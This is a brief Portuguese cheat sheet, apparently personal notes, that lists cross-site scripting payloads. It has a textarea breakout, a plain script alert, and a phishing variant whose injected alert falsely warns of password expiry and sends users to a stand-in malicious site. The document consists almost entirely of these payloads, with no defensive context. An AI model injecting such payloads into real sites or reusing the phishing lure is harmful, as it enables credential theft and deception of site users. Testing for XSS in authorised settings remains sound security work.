### XSS

Alert em campo de texto:

    </textarea><script>alert('XSS');</script>

Alert simples:

    <script>alert('XSS');</script>

Phishing no alert:

    </textarea><script>alert('Atenção! Sua senha está prestes a expirar, portanto é obrigatória a renovação de senha para evitar problemas com a sua conta. Acesse http://sitemalicioso.net e renove agora mesmo sua senha!');</script>

    teste